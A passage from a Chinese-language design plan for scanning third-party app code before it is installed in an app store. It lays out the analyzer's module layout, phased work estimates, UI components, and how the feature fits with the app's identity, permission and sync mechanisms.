├── types.ts                  # 类型定义
├── riskPatterns.ts           # 风险模式定义
├── extractor.ts              # 代码提取器
├── analyzer.ts               # 分析器主逻辑
├── obfuscationDetector.ts    # 混淆检测器 ← 新增
└── reporter.ts               # 报告生成器
```

### Phase 2: 集成到安装流程 (P0)

**预估工时**: 2-4h

1. 在 `appStoreStore.importFromUrl()` 中添加分析
2. 在 `appStoreStore.importFromFile()` 中添加分析
3. 根据分析结果显示警告或阻止安装

### Phase 3: 用户界面 (P1)

**预估工时**: 4-6h

1. `SecurityReportDialog.vue` - 分析报告对话框
2. `SecurityBadge.vue` - 安全状态徽章
3. `RiskIndicator.vue` - 风险指示器组件
4. 集成到应用详情页

### Phase 4: 持久化与展示 (P2)

**预估工时**: 2-4h

1. 将分析报告保存到 `InstalledAppExtended`
2. 应用管理页面显示安全状态
3. 设置页面添加安全相关选项

---

## 与其他安全机制的关系

```
┌─────────────────────────────────────────────────────────────────┐
│                      安全体系全景                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│  1. App 身份识别 (已完成)                                         │
│     └── 确定 App 来源和信任级别                                   │
│                                                                   │
│  2. 静态代码分析 (本次设计) ← 你在这里                            │
│     └── 安装前扫描代码，识别风险，告知用户                        │
│                                                                   │
│  3. 存储权限控制 (之前设计)                                       │
│     └── 运行时限制 App 对数据的访问                               │
│                                                                   │
│  4. 云同步 (之前设计)                                             │
│     └── 数据备份与恢复                                            │
│                                                                   │
│  决策流程:                                                        │
│                                                                   │
│  用户导入 App → [静态分析] → 显示报告 → 用户确认 →                 │
│  [身份验证] → 安装 → [运行时权限控制] → 正常使用                   │
│                                                                   │
└─────────────────────────────────────────────────────────────────┘
```
